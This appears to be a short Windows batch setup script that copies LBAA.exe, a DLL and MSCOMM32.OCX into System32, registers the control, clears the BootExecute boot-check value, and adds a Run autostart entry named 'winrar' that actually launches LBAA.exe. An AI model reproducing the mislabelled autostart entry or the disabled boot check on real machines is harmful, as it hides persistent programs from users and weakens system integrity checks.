reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /d "" /t REG_MULTI_SZ /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /d 00000002 /t REG_DWORD /f
copy LBAA.exe %SystemRoot%\System32\LBAA.exe
copy PCH8522_32.dll %SystemRoot%\System32\PCH8522_32.dll
copy MSCOMM32.OCX %SystemRoot%\System32\MSCOMM32.OCX
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v winrar /t reg_sz /d "LBAA.exe" /f
regsvr32 "%SystemRoot%\System32\MSCOMM32.OCX"
mkdir c:\data
pause